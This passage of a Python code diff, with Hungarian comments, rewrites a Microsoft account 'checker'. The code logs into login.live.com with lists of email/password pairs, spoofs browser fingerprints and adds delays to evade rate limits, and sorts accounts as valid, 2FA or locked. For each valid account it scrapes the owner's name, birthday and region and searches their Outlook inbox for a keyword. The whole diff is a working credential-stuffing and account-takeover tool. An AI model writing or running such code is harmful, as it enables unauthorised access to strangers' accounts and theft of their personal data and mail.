+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": '"Windows"',
+        "sec-ch-ua-platform-version": '""',
+        "Accept-Language": fp.accept_language,
+        "Origin": "https://login.live.com",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+        "Sec-Fetch-Site": "same-origin",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-User": "?1",
+        "Sec-Fetch-Dest": "document",
+        "Referer": "https://login.live.com/",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Priority": "u=0, i",
+        "Connection": "keep-alive",
+        "Upgrade-Insecure-Requests": "1",
+        "User-Agent": fp.user_agent,
+    }
 
-        Name = ""
-        Country = ""
-        Birthdate = "N/A"
-        Total = "NO"
-        Date = "N/A"
+    resp2 = session.post(post_url, data=post_body, headers=post_headers,
+                         allow_redirects=True, timeout=30)
 
-        # ═══════════════════════════════════════
-        # 4. LÉPÉS: Profil lekérése
-        # ═══════════════════════════════════════
-        _rate_limiter.wait_before_request()
+    if is_rate_limited(resp2):
+        return {"_rate_limited": True, "status": "error", "reason": "Rate limited step2"}
 
-        profile_url = (
-            "https://substrate.office.com/"
-            "profileb2/v2.0/me/V1Profile"
-        )
-        profile_headers = {
-            "User-Agent": "Outlook-Android/2.0",
-            "Pragma": "no-cache",
-            "Accept": "application/json",
-            "ForceSync": "false",
-            "Authorization": f"Bearer {access_token}",
-            "X-AnchorMailbox": f"CID:{CID}",
-            "Host": "substrate.office.com",
-            "Connection": "Keep-Alive",
-            "Accept-Encoding": "gzip"
-        }
+    source2 = resp2.text
 
-        pRes = session.get(
-            profile_url, headers=profile_headers, timeout=30
-        )
+    # ============================================================
+    # STEP 3: KEYCHECK - pontosan a config szerint
+    # ============================================================
 
-        signal = detect_block_signals(pRes)
-        if signal != "ok":
-            _rate_limiter.report_error(signal)
-        else:
-            _rate_limiter.report_success()
+    # FAILURE checks
+    failure_keys = [
+        "That Microsoft account doesn't exist",
+        "Your account or password is incorrect",
+        "That Microsoft account doesn\\'t exist.",
+        "Please enter the password for your Microsoft account.",
+    ]
+    for key in failure_keys:
+        if key in source2:
+            return {"status": "bad", "reason": "Invalid credentials"}
 
-        if pRes.status_code == 200:
-            profile_data = pRes.json()
-            if ("accounts" in profile_data
-                    and profile_data["accounts"]):
-                first_account = profile_data["accounts"][0]
-                Country = first_account.get("location", "")
-                BD = first_account.get("birthDay", "")
-                BM = first_account.get("birthMonth", "")
-                BY = first_account.get("birthYear", "")
-                if BD and BM and BY:
-                    Birthdate = (
-                        f"{BY}-{str(BM).zfill(2)}-"
-                        f"{str(BD).zfill(2)}"
-                    )
-            if ("names" in profile_data
-                    and profile_data["names"]):
-                first_name = profile_data["names"][0]
-                Name = first_name.get("displayName", "")
+    # RETRY check - "You've tried to sign in too many times"
+    if is_too_many_signins(source2):
+        return {"_retry": True, "status": "error", "reason": "Too many sign-in attempts"}
 
-        # ═══════════════════════════════════════
-        # 5. LÉPÉS: Email keresés
-        # ═══════════════════════════════════════
-        _rate_limiter.wait_before_request()
+    # RETRY - "Too Many Requests"
+    if "Too Many Requests" in source2:
+        return {"_rate_limited": True, "status": "error", "reason": "Too Many Requests"}
 
-        search_url = (
-            "https://outlook.live.com/search/api/v2/query"
-            "?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124"
-        )
-        search_payload = {
-            "Cvid": str(uuid.uuid4()),
-            "Scenario": {"Name": "owa.react"},
-            "TimeZone": "United Kingdom Standard Time",
-            "TextDecorations": "Off",
-            "EntityRequests": [{
-                "EntityType": "Conversation",
-                "ContentSources": ["Exchange"],
-                "Filter": {
-                    "Or": [
-                        {"Term": {
-                            "DistinguishedFolderName": "msgfolderroot"
-                        }},
-                        {"Term": {
-                            "DistinguishedFolderName": "DeletedItems"
-                        }}
-                    ]
-                },
-                "From": 0,
-                "Query": {"QueryString": keyword},
-                "RefiningQueries": None,
-                "Size": 25,
-                "Sort": [
-                    {
-                        "Field": "Score",
-                        "SortDirection": "Desc",
-                        "Count": 3
-                    },
-                    {
-                        "Field": "Time",
-                        "SortDirection": "Desc"
-                    }
-                ],
-                "EnableTopResults": True,
-                "TopResultsCount": 3
-            }],
-            "AnswerEntityRequests": [{
-                "Query": {"QueryString": keyword},
-                "EntityTypes": ["Event", "File"],
-                "From": 0,
-                "Size": 100,
-                "EnableAsyncResolution": True
-            }],
-            "QueryAlterationOptions": {
-                "EnableSuggestion": True,
-                "EnableAlteration": True,
-                "SupportedRecourseDisplayTypes": [
-                    "Suggestion",
-                    "NoResultModification",
-                    "NoResultFolderRefinerModification",
-                    "NoRequeryModification",
-                    "Modification"
-                ]
-            },
-            "LogicalId": str(uuid.uuid4())
-        }
-
-        search_headers = {
-            "User-Agent": fp["user_agent"],
-            "Pragma": "no-cache",
-            "Accept": "application/json",
-            "ForceSync": "false",
-            "Authorization": f"Bearer {access_token}",
-            "X-AnchorMailbox": f"CID:{CID}",
-            "Host": "outlook.live.com",
-            "Connection": "Keep-Alive",
-            "Accept-Encoding": "gzip",
-            "Content-Type": "application/json"
-        }
-
-        search_response = session.post(
-            search_url, json=search_payload,
-            headers=search_headers, timeout=30
-        )
-
-        signal = detect_block_signals(search_response)
-        if signal != "ok":
-            _rate_limiter.report_error(signal)
-        else:
-            _rate_limiter.report_success()
-
-        if search_response.status_code == 200:
-            search_text = search_response.text
-
-            date_start = search_text.find('"LastModifiedTime":"')
-            if date_start != -1:
-                date_start += len('"LastModifiedTime":"')
-                date_end = search_text.find('"', date_start)
-                raw_date = (
-                    search_text[date_start:date_end]
-                    if date_end != -1 else "N/A"
-                )
-                if raw_date != "N/A":
-                    Date = raw_date.replace("T", " ")[:16]
-
-            total_start = search_text.find('"Total":')
-            if total_start != -1:
-                total_start += len('"Total":')
-                total_end = search_text.find(',', total_start)
-                if total_end == -1:
-                    total_end = search_text.find('}', total_start)
-                Total = (
-                    search_text[total_start:total_end].strip()
-                    if total_end != -1 else "NO"
-                )
-
-        # ═══════════════════════════════════════
-        # EREDMÉNY
-        # ═══════════════════════════════════════
-        if Total != "0" and Total != "NO":
-            return {
-                "status": "hit",
-                "data": {
-                    "email": email,
-                    "password": password,
-                    "country": Country,
-                    "name": Name,
-                    "birthdate": Birthdate,
-                    "date": Date,
-                    "mails": Total
-                }
-            }
-        elif Name or Country:
+    # CUSTOM "2FACTOR" checks
+    two_factor_keys = [
+        "account.live.com/recover?mkt",
+        "recover?mkt",
+        "account.live.com/identity/confirm?mkt",
+        "',CW:true",
+        "Email/Confirm?mkt",
+    ]
+    for key in two_factor_keys:
+        if key in source2:
             return {
                 "status": "custom",
                 "data": {
                     "email": email,
                     "password": password,
-                    "country": Country,
-                    "name": Name,
-                    "birthdate": Birthdate
+                    "country": "2FA",
+                    "name": "2FACTOR",
+                    "birthdate": "N/A",
                 }
             }
-        else:
-            return {"status": "bad", "reason": "No data"}
 
-    except requests.exceptions.Timeout:
-        _rate_limiter.report_error("generic")
-        return {"status": "error", "reason": "Timeout"}
-    except requests.exceptions.ConnectionError:
-        _rate_limiter.report_error("rate_limit")
-        return {"status": "error", "reason": "Connection refused"}
-    except Exception as e:
-        _rate_limiter.report_error("generic")
-        return {"status": "error", "reason": str(e)}
-    finally:
-        session.close()
+    # CUSTOM "CUSTOM" checks
+    custom_keys = ["/cancel?mkt=", "/Abuse?mkt=", "Add?mkt="]
+    for key in custom_keys:
+        if key in source2:
+            return {
+                "status": "custom",
+                "data": {
+                    "email": email,
+                    "password": password,
+                    "country": "",
+                    "name": "LOCKED/CUSTOM",
+                    "birthdate": "N/A",
+                }
+            }
+
+    # SUCCESS check - __Host-MSAAUTHP cookie vagy uaid value
+    cookies_dict = session.cookies.get_dict()
+    has_auth = "__Host-MSAAUTHP" in cookies_dict
+    has_uaid_in_source = 'id="uaid" value="' in source2
+
+    if not has_auth and not has_uaid_in_source:
+        return {"status": "bad", "reason": "Auth failed - no success indicators"}
+
+    # ============================================================
+    # STEP 4: GET account.microsoft.com (profil oldal)
+    # Config: GET https://account.microsoft.com/?ref=MeControl&username=<USER>
+    # ============================================================
+
+    time.sleep(random.uniform(0.3, 1.0))
+
+    step4_url = f"https://account.microsoft.com/?ref=MeControl&username={quote(email)}"
+    step4_headers = {
+        "Host": "account.microsoft.com",
+        "Connection": "keep-alive",
+        "sec-ch-ua": fp.sec_ch_ua,
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": '"Windows"',
+        "Upgrade-Insecure-Requests": "1",
+        "User-Agent": fp.user_agent,
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+        "Sec-Fetch-Site": "cross-site",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-User": "?1",
+        "Sec-Fetch-Dest": "document",
+        "Referer": "https://www.xbox.com/",
+        "Accept-Language": fp.accept_language,
+        "Accept-Encoding": "gzip, deflate",
+    }
+
+    resp4 = session.get(step4_url, headers=step4_headers, allow_redirects=True, timeout=30)
+
+    if is_rate_limited(resp4):
+        # Nem kritikus - folytatjuk profil adatok nélkül
+        return _build_result_without_profile(email, password, keyword, session, fp)
+
+    if resp4.status_code != 200:
+        # Retry
+        return _build_result_without_profile(email, password, keyword, session, fp)
+
+    source4 = resp4.text
+
+    # ============================================================
+    # STEP 5: PARSE hidden fields + POST complete-signin
+    # Config: extract NAPExp, pprid, NAP, ANON, ANONExp, t
+    # ============================================================
+
+    nap_exp = extract_css_value(source4, "NAPExp")
+    pprid = extract_css_value(source4, "pprid")
+    nap = extract_css_value(source4, "NAP")
+    anon = extract_css_value(source4, "ANON")
+    anon_exp = extract_css_value(source4, "ANONExp")
+    t_value = extract_css_value(source4, "t")
+
+    if t_value:
+        time.sleep(random.uniform(0.2, 0.6))
+
+        step5_url = (
+            "https://account.microsoft.com/auth/complete-signin?"
+            "ru=https%3A%2F%2Faccount.microsoft.com%2F%3Fref%3DMeControl"
+            "%26refd%3Dwww.xbox.com&wa=wsignin1.0"
+        )
+
+        step5_body = (
+            f"NAPExp={quote(nap_exp)}"
+            f"&pprid={quote(pprid)}"
+            f"&NAP={quote(nap)}"
+            f"&ANON={quote(anon)}"
+            f"&ANONExp={quote(anon_exp)}"
+            f"&t={quote(t_value)}"
+        )
+
+        step5_headers = {
+            "Host": "account.microsoft.com",
+            "Connection": "keep-alive",
+            "Cache-Control": "max-age=0",
+            "sec-ch-ua": fp.sec_ch_ua,
+            "sec-ch-ua-mobile": "?0",
+            "sec-ch-ua-platform": '"Windows"',
+            "Upgrade-Insecure-Requests": "1",
+            "Origin": "https://login.live.com",
+            "Content-Type": "application/x-www-form-urlencoded",
+            "User-Agent": fp.user_agent,
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+            "Sec-Fetch-Site": "cross-site",
+            "Sec-Fetch-Mode": "navigate",
+            "Sec-Fetch-Dest": "document",
+            "Referer": "https://login.live.com/",
+            "Accept-Language": fp.accept_language,
+            "Accept-Encoding": "gzip, deflate",
+        }
+
+        resp5 = session.post(step5_url, data=step5_body, headers=step5_headers,
+                             allow_redirects=True, timeout=30)
+
+    # ============================================================
+    # STEP 6: GET account page + extract __RequestVerificationToken
+    # ============================================================
+
+    time.sleep(random.uniform(0.2, 0.5))
+
+    step6_url = "https://account.microsoft.com/?ref=MeControl&refd=www.xbox.com"
+    step6_headers = {
+        "Host": "account.microsoft.com",
+        "Connection": "keep-alive",
+        "Cache-Control": "max-age=0",
+        "Upgrade-Insecure-Requests": "1",
+        "User-Agent": fp.user_agent,
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+        "Sec-Fetch-Site": "cross-site",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-Dest": "document",
+        "sec-ch-ua": fp.sec_ch_ua,
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": '"Windows"',
+        "Referer": "https://login.live.com/",
+        "Accept-Language": fp.accept_language,
+        "Accept-Encoding": "gzip, deflate",
+    }
+
+    resp6 = session.get(step6_url, headers=step6_headers, allow_redirects=True, timeout=30)
+
+    if resp6.status_code != 200:
+        return _build_result_without_profile(email, password, keyword, session, fp)
+
+    source6 = resp6.text
+    verification_token = extract_css_value(source6, "__RequestVerificationToken")
+
+    # ============================================================
+    # STEP 7: GET personal-info API (profil adatok)
+    # Config: GET account.microsoft.com/profile/api/v1/personal-info
+    # ============================================================
+
+    Name = ""
+    Country = ""
+    Birthdate = "N/A"
+
+    if verification_token:
+        time.sleep(random.uniform(0.2, 0.5))
+
+        # Először a home API-t próbáljuk (config step)
+        info_url = "https://account.microsoft.com/home/api/profile/personal-info"
+        info_headers = {
+            "Host": "account.microsoft.com",
+            "Connection": "keep-alive",
+            "sec-ch-ua": fp.sec_ch_ua,
+            "sec-ch-ua-mobile": "?0",
+            "Correlation-Context": f"v=1,ms.b.tel.market={fp.market}",
+            "User-Agent": fp.user_agent,
+            "Accept": "application/json, text/plain, */*",
+            "X-Requested-With": "XMLHttpRequest",
+            "__RequestVerificationToken": verification_token,
+            "sec-ch-ua-platform": '"Windows"',
+            "Sec-Fetch-Site": "same-origin",
+            "Sec-Fetch-Mode": "cors",
+            "Sec-Fetch-Dest": "empty",
+            "Referer": "https://account.microsoft.com/?ref=MeControl&refd=www.xbox.com",
+            "Accept-Language": fp.accept_language,
+            "Accept-Encoding": "gzip, deflate",
+        }
+
+        try:
+            resp_info = session.get(info_url, headers=info_headers, timeout=30)
+            if resp_info.status_code == 200:
+                info_text = resp_info.text
+                # A config parse-olásai:
+                # "region":"..." -> Country
+                Country = extract_between(info_text, '"region":"', '",')
+                if not Country:
+                    Country = extract_between(info_text, '"region":"', '"')
+        except:
+            pass
+
+        # Második API endpoint: profile/api/v1/personal-info
+        time.sleep(random.uniform(0.1, 0.4))
+
+        info_url2 = "https://account.microsoft.com/profile/api/v1/personal-info"
+        info_headers2 = {
+            "Host": "account.microsoft.com",
+            "User-Agent": fp.user_agent,
+            "Accept": "application/json, text/plain, */*",
+            "Accept-Language": fp.accept_language,
+            "Accept-Encoding": "gzip, deflate, br",
+            "X-Requested-With": "XMLHttpRequest",
+            "MS-CV": _generate_ms_cv(),
+            "__RequestVerificationToken": verification_token,
+            "Correlation-Context": f"v=1,ms.b.tel.market={fp.market}",
+            "Connection": "keep-alive",
+            "Referer": "https://account.microsoft.com/?ref=MeControl&refd=www.xbox.com",
+            "Sec-Fetch-Dest": "empty",
+            "Sec-Fetch-Mode": "cors",
+            "Sec-Fetch-Site": "same-origin",
+        }
+
+        try:
+            resp_info2 = session.get(info_url2, headers=info_headers2, timeout=30)
+            if resp_info2.status_code == 200:
+                info_text2 = resp_info2.text
+
+                # Config parse: "fullName":"..." -> Name
+                name_val = extract_between(info_text2, '"fullName":"', '",')
+                if not name_val:
+                    name_val = extract_between(info_text2, '"fullName":"', '"')
+                if name_val:
+                    Name = name_val
+
+                # Config parse: "birthday":"..." -> Birthday
+                bday_val = extract_between(info_text2, '"birthday":"', '",')
+                if not bday_val:
+                    bday_val = extract_between(info_text2, '"birthday":"', '"')
+                if bday_val:
+                    Birthdate = bday_val
+
+                # Config parse: "region":"..." -> Country (ha még nincs)
+                if not Country:
+                    region_val = extract_between(info_text2, '"region":"', '",')
+                    if not region_val:
+                        region_val = extract_between(info_text2, '"region":"', '"')
+                    if region_val:
+                        Country = region_val
+        except:
+            pass
+
+    # ============================================================
+    # STEP 8: Inbox keresés a keyword-re
+    # Ez a config-ban nincs benne, de neked kell az inbox check
+    # Használjuk az outlook.live.com webes keresést cookie auth-tal
+    # ============================================================
+
+    Total = "NO"
+    Date = "N/A"
+
+    try:
+        time.sleep(random.uniform(0.3, 0.8))
+
+        # Outlook web session indítás
+        owa_url = "https://outlook.live.com/mail/0/"
+        owa_headers = {
+            "User-Agent": fp.user_agent,
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept-Language": fp.accept_language,
+            "Accept-Encoding": "gzip, deflate, br",
+            "Connection": "keep-alive",
+            "Upgrade-Insecure-Requests": "1",
+        }
+
+        resp_owa = session.get(owa_url, headers=owa_headers, allow_redirects=True, timeout=30)
+
+        if resp_owa.status_code == 200 and "outlook" in resp_owa.url.lower():
+            time.sleep(random.uniform(0.3, 0.8))
+
+            # Keresés API
+            search_url = "https://outlook.live.com/search/api/v2/query"
+            search_payload = {
+                "Cvid": str(uuid.uuid4()),
+                "Scenario": {"Name": "owa.react"},
+                "TimeZone": "UTC",
+                "TextDecorations": "Off",
+                "EntityRequests": [{
+                    "EntityType": "Conversation",
+                    "ContentSources": ["Exchange"],
+                    "Filter": {
+                        "Or": [
+                            {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
+                            {"Term": {"DistinguishedFolderName": "DeletedItems"}}
+                        ]
+                    },
+                    "From": 0,
+                    "Query": {"QueryString": keyword},
+                    "RefiningQueries": None,
+                    "Size": 25,
+                    "Sort": [
+                        {"Field": "Score", "SortDirection": "Desc", "Count": 3},
+                        {"Field": "Time", "SortDirection": "Desc"}
+                    ],
+                    "EnableTopResults": True,
+                    "TopResultsCount": 3
+                }],
+                "QueryAlterationOptions": {
+                    "EnableSuggestion": True,
+                    "EnableAlteration": True,
+                    "SupportedRecourseDisplayTypes": [
+                        "Suggestion", "NoResultModification",
+                        "NoResultFolderRefinerModification",
+                        "NoRequeryModification", "Modification"
+                    ]
+                },
+                "LogicalId": str(uuid.uuid4()),
+            }
+
+            search_headers = {
+                "User-Agent": fp.user_agent,
+                "Accept": "application/json",
+                "Content-Type": "application/json",
+                "Accept-Language": fp.accept_language,
+                "Accept-Encoding": "gzip, deflate, br",
+                "Connection": "keep-alive",
+                "Sec-Fetch-Site": "same-origin",
+                "Sec-Fetch-Mode": "cors",
+                "Sec-Fetch-Dest": "empty",
+                "Referer": "https://outlook.live.com/mail/0/",
+            }
+
+            resp_search = session.post(search_url, json=search_payload,
+                                       headers=search_headers, timeout=30)
+
+            if resp_search.status_code == 200:
+                search_text = resp_search.text
+
+                # Dátum kinyerése
+                date_start = search_text.find('"LastModifiedTime":"')
+                if date_start != -1:
+                    date_start += len('"LastModifiedTime":"')
+                    date_end = search_text.find('"', date_start)
+                    raw_date = search_text[date_start:date_end] if date_end != -1 else "N/A"
+                    if raw_date != "N/A":
+                        Date = raw_date.replace("T", " ")[:16]
+
+                # Total kinyerése
+                total_start = search_text.find('"Total":')
+                if total_start != -1:
+                    total_start += len('"Total":')
+                    total_end = search_text.find(',', total_start)
+                    if total_end == -1:
+                        total_end = search_text.find('}', total_start)
+                    Total = search_text[total_start:total_end].strip() if total_end != -1 else "NO"
+    except:
+        pass
+
+    # ============================================================
+    # EREDMÉNY ÖSSZEÁLLÍTÁSA
+    # ============================================================
+
+    if Total != "0" and Total != "NO":
+        return {
+            "status": "hit",
+            "data": {
+                "email": email,
+                "password": password,
+                "country": Country,
+                "name": Name,
+                "birthdate": Birthdate,
+                "date": Date,
+                "mails": Total,
+            }
+        }
+    elif Name or Country:
+        return {
+            "status": "custom",
+            "data": {
+                "email": email,
+                "password": password,
+                "country": Country,
+                "name": Name,
+                "birthdate": Birthdate,
+            }
+        }
+    else:
+        # Bejelentkezés sikeres volt, de nincs profil adat
+        return {
+            "status": "custom",
+            "data": {
+                "email": email,
+                "password": password,
+                "country": "",
+                "name": "Valid (no profile)",
+                "birthdate": "N/A",
+            }
+        }
 
 
-def get_rate_limiter_status() -> dict:
-    """Rate limiter állapot lekérése (main.py-ból hívható)"""
-    return _rate_limiter.get_status()
+def _build_result_without_profile(email: str, password: str, keyword: str, session, fp: BrowserFingerprint):
+    """
+    Ha a profil oldal nem elérhető, de a bejelentkezés sikeres volt
+    Megpróbáljuk az inbox keresést közvetlenül
+    """
+
+    Total = "NO"
+    Date = "N/A"
+
+    try:
+        time.sleep(random.uniform(0.3, 0.8))
+
+        owa_url = "https://outlook.live.com/mail/0/"
+        owa_headers = {
+            "User-Agent": fp.user_agent,
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept-Language": fp.accept_language,
+            "Connection": "keep-alive",
+            "Upgrade-Insecure-Requests": "1",
+        }
+
+        resp_owa = session.get(owa_url, headers=owa_headers, allow_redirects=True, timeout=30)
+
+        if resp_owa.status_code == 200:
+            time.sleep(random.uniform(0.3, 0.8))
+
+            search_url = "https://outlook.live.com/search/api/v2/query"
+            search_payload = {
+                "Cvid": str(uuid.uuid4()),
+                "Scenario": {"Name": "owa.react"},
+                "TimeZone": "UTC",
+                "TextDecorations": "Off",
+                "EntityRequests": [{
+                    "EntityType": "Conversation",
+                    "ContentSources": ["Exchange"],
+                    "Filter": {
+                        "Or": [
+                            {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
+                            {"Term": {"DistinguishedFolderName": "DeletedItems"}}
+                        ]
+                    },
+                    "From": 0,
+                    "Query": {"QueryString": keyword},
+                    "Size": 25,
+                    "Sort": [
+                        {"Field": "Score", "SortDirection": "Desc", "Count": 3},
+                        {"Field": "Time", "SortDirection": "Desc"}
+                    ],
+                    "EnableTopResults": True,
+                    "TopResultsCount": 3
+                }],
+                "LogicalId": str(uuid.uuid4()),
+            }
+
+            search_headers = {
+                "User-Agent": fp.user_agent,
+                "Accept": "application/json",
+                "Content-Type": "application/json",
+                "Connection": "keep-alive",
+            }
+
+            resp_search = session.post(search_url, json=search_payload,
+                                       headers=search_headers, timeout=30)
+
+            if resp_search.status_code == 200:
+                search_text = resp_search.text
+
+                date_start = search_text.find('"LastModifiedTime":"')
+                if date_start != -1:
+                    date_start += len('"LastModifiedTime":"')
+                    date_end = search_text.find('"', date_start)
+                    raw_date = search_text[date_start:date_end] if date_end != -1 else "N/A"
+                    if raw_date != "N/A":
+                        Date = raw_date.replace("T", " ")[:16]
+
+                total_start = search_text.find('"Total":')
+                if total_start != -1:
+                    total_start += len('"Total":')
+                    total_end = search_text.find(',', total_start)
+                    if total_end == -1:
+                        total_end = search_text.find('}', total_start)
+                    Total = search_text[total_start:total_end].strip() if total_end != -1 else "NO"
+    except:
+        pass
+
+    if Total != "0" and Total != "NO":
+        return {
+            "status": "hit",
+            "data": {
+                "email": email,
+                "password": password,
+                "country": "",
+                "name": "",
+                "birthdate": "N/A",
+                "date": Date,
+                "mails": Total,
+            }
+        }
+    else:
+        return {
+            "status": "custom",
+            "data": {
+                "email": email,
+                "password": password,
+                "country": "",
+                "name": "Valid (profile N/A)",
+                "birthdate": "N/A",
+            }
+        }
+
+
+def _generate_ms_cv():
+    """MS-CV header generálás (mint a config-ban)"""
+    chars = string.ascii_letters + string.digits
+    base = ''.join(random.choices(chars, k=16))
+    return f"{base}.{random.randint(1,20)}.{random.randint(1,99)}"
